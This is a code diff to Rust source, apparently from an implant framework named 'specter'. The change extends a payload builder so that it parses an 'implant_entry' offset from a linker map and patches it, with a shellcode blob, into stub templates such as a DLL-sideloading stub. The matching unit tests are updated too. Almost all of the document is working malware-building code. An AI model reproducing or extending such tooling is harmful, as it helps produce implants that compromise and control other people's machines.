@@ -116,6 +116,9 @@ pub struct PayloadBuilder {
     templates: HashMap<OutputFormat, TemplateBlob>,
     /// Path to template directory.
     template_dir: PathBuf,
+    /// Entry point offset into the PIC blob (from specter.map).
+    /// The stub jumps to pic_base + entry_offset.
+    pic_entry_offset: u32,
 }
 
 impl PayloadBuilder {
@@ -126,6 +129,7 @@ impl PayloadBuilder {
         let mut builder = Self {
             templates: HashMap::new(),
             template_dir: config.template_dir.clone(),
+            pic_entry_offset: 0,
         };
         builder.load_templates()?;
         Ok(builder)
@@ -164,6 +168,30 @@ impl PayloadBuilder {
                         format: *format,
                     },
                 );
+            }
+        }
+
+        // Load entry point offset from specter.map (grep for implant_entry address)
+        let map_path = self.template_dir.join("specter.map");
+        if map_path.exists() {
+            if let Ok(map_content) = std::fs::read_to_string(&map_path) {
+                for line in map_content.lines() {
+                    if line.contains("implant_entry") && !line.contains(".refptr") {
+                        // Line format: "                0x0000000000001020                implant_entry"
+                        if let Some(addr_str) = line.trim().split_whitespace().next() {
+                            if let Some(hex) = addr_str.strip_prefix("0x") {
+                                if let Ok(addr) = u64::from_str_radix(hex, 16) {
+                                    self.pic_entry_offset = addr as u32;
+                                    tracing::info!(
+                                        "PIC entry offset: 0x{:X} (from specter.map)",
+                                        self.pic_entry_offset
+                                    );
+                                }
+                            }
+                        }
+                        break;
+                    }
+                }
             }
         }
 
@@ -247,7 +275,7 @@ impl PayloadBuilder {
 
             // Embed the PIC blob into the stub at the SPECPICBLOB marker
             if let Some(pic_template) = self.templates.get(&OutputFormat::RawShellcode) {
-                patched = Self::embed_pic_blob(patched, &pic_template.data)?;
+                patched = Self::embed_pic_blob(patched, &pic_template.data, self.pic_entry_offset)?;
             }
 
             patched
@@ -372,15 +400,18 @@ impl PayloadBuilder {
     }
 
     /// Embed a PIC blob into a PE template by locating the PIC placeholder marker
-    /// and patching it with the actual PIC blob data.
+    /// and patching it with the actual PIC blob data + entry offset.
     ///
-    /// Marker: `SPECPICBLOB\x00` (12 bytes) followed by 4-byte LE size field.
-    /// The builder writes the PIC blob size into the size field and copies
-    /// the PIC blob data into the space following it.
+    /// Marker layout in stub: `[SPECPICBLOB\x00 (12)][pic_size: u32][entry_offset: u32][pic_data...]`
+    /// The builder writes pic_size, entry_offset, and copies pic_data.
     ///
     /// The stubs allocate a large `.data` region after the marker
     /// (PIC_MAX_CAPACITY = 256KB) which the builder fills with PIC data.
-    fn embed_pic_blob(mut payload: Vec<u8>, pic_blob: &[u8]) -> Result<Vec<u8>, BuilderError> {
+    fn embed_pic_blob(
+        mut payload: Vec<u8>,
+        pic_blob: &[u8],
+        entry_offset: u32,
+    ) -> Result<Vec<u8>, BuilderError> {
         const PIC_MARKER: &[u8; 12] = b"SPECPICBLOB\x00";
         const PIC_MAX_CAPACITY: usize = 256 * 1024;
 
@@ -391,15 +422,15 @@ impl PayloadBuilder {
         if let Some(marker_pos) = find_marker(&payload, PIC_MARKER) {
             let size_offset = marker_pos + PIC_MARKER.len();
 
-            // Verify there is room for the size field
-            if size_offset + 4 > payload.len() {
+            // Verify there is room for size + entry_offset fields
+            if size_offset + 8 > payload.len() {
                 return Err(BuilderError::Config(
-                    "PIC blob marker found but size field truncated".into(),
+                    "PIC blob marker found but header fields truncated".into(),
                 ));
             }
 
-            // Check that the PIC blob fits within the allocated capacity
-            let data_offset = size_offset + 4;
+            // Data starts after marker(12) + pic_size(4) + entry_offset(4)
+            let data_offset = size_offset + 8;
             let available = payload.len().saturating_sub(data_offset);
             if pic_blob.len() > available || pic_blob.len() > PIC_MAX_CAPACITY {
                 return Err(BuilderError::Config(format!(
@@ -410,11 +441,15 @@ impl PayloadBuilder {
                 )));
             }
 
-            // Write PIC blob size (u32 LE) at the size field
-            let size_bytes = (pic_blob.len() as u32).to_le_bytes();
-            payload[size_offset..size_offset + 4].copy_from_slice(&size_bytes);
+            // Write PIC blob size (u32 LE)
+            payload[size_offset..size_offset + 4]
+                .copy_from_slice(&(pic_blob.len() as u32).to_le_bytes());
 
-            // Copy PIC blob data into the region after the size field
+            // Write entry offset (u32 LE)
+            payload[size_offset + 4..size_offset + 8]
+                .copy_from_slice(&entry_offset.to_le_bytes());
+
+            // Copy PIC blob data
             payload[data_offset..data_offset + pic_blob.len()]
                 .copy_from_slice(pic_blob);
         } else {
@@ -658,16 +693,18 @@ transform:
 
     #[test]
     fn test_embed_pic_blob_with_marker() {
-        // Create a payload with a PIC marker + size field + space
+        // Create a payload with a PIC marker + size + entry_offset + space
         let mut template = vec![0x00u8; 4096];
         // Place PIC marker at offset 100
         template[100..112].copy_from_slice(b"SPECPICBLOB\x00");
-        // Size field (4 bytes, initially 0)
+        // Size field (4 bytes, initially 0) at 112
         template[112..116].copy_from_slice(&0u32.to_le_bytes());
-        // Remaining bytes are space for PIC data
+        // Entry offset field (4 bytes, initially 0) at 116
+        template[116..120].copy_from_slice(&0u32.to_le_bytes());
+        // PIC data space starts at 120
 
         let pic_blob = vec![0xCC; 256];
-        let result = PayloadBuilder::embed_pic_blob(template.clone(), &pic_blob).unwrap();
+        let result = PayloadBuilder::embed_pic_blob(template.clone(), &pic_blob, 0x1020).unwrap();
 
         // Size field should now contain 256
         let embedded_size = u32::from_le_bytes([
@@ -675,8 +712,14 @@ transform:
         ]);
         assert_eq!(embedded_size, 256);
 
-        // PIC data should be at offset 116
-        assert_eq!(&result[116..116 + 256], &pic_blob[..]);
+        // Entry offset should be 0x1020
+        let embedded_entry = u32::from_le_bytes([
+            result[116], result[117], result[118], result[119],
+        ]);
+        assert_eq!(embedded_entry, 0x1020);
+
+        // PIC data should be at offset 120
+        assert_eq!(&result[120..120 + 256], &pic_blob[..]);
 
         // Overall size unchanged (in-place patching)
         assert_eq!(result.len(), 4096);
@@ -685,7 +728,7 @@ transform:
     #[test]
     fn test_embed_pic_blob_empty_blob() {
         let template = vec![0x00u8; 512];
-        let result = PayloadBuilder::embed_pic_blob(template.clone(), &[]).unwrap();
+        let result = PayloadBuilder::embed_pic_blob(template.clone(), &[], 0).unwrap();
         // No changes when blob is empty
         assert_eq!(result, template);
     }
@@ -695,7 +738,7 @@ transform:
         // Template without PIC marker -- should succeed with warning
         let template = vec![0x00u8; 512];
         let pic_blob = vec![0xCC; 64];
-        let result = PayloadBuilder::embed_pic_blob(template.clone(), &pic_blob).unwrap();
+        let result = PayloadBuilder::embed_pic_blob(template.clone(), &pic_blob, 0).unwrap();
         // Payload unchanged (no marker to patch)
         assert_eq!(result, template);
     }
@@ -715,9 +758,10 @@ transform:
         stub[64..80].copy_from_slice(b"CCCCCCCCCCCCCCCC");
         stub[80..84].copy_from_slice(&1024u32.to_le_bytes());
 
-        // PIC marker at offset 2048
+        // PIC marker at offset 2048: [marker:12][size:4][entry_off:4][data...]
         stub[2048..2060].copy_from_slice(b"SPECPICBLOB\x00");
-        stub[2060..2064].copy_from_slice(&0u32.to_le_bytes());
+        stub[2060..2064].copy_from_slice(&0u32.to_le_bytes()); // size
+        stub[2064..2068].copy_from_slice(&0u32.to_le_bytes()); // entry_offset
 
         std::fs::write(dir.path().join("sideload_stub.dll"), &stub).unwrap();
 
@@ -755,8 +799,17 @@ transform:
         ]);
         assert_eq!(pic_size, 128);
 
-        // PIC blob data should be at offset 2064
-        assert_eq!(&result.payload[2064..2064 + 128], &pic_data[..]);
+        // Entry offset at 2064 (0 since no map file in test)
+        let entry_off = u32::from_le_bytes([
+            result.payload[2064],
+            result.payload[2065],
+            result.payload[2066],
+            result.payload[2067],
+        ]);
+        assert_eq!(entry_off, 0);
+
+        // PIC blob data should be at offset 2068
+        assert_eq!(&result.payload[2068..2068 + 128], &pic_data[..]);
 
         // Payload size unchanged
         assert_eq!(result.payload.len(), stub.len());
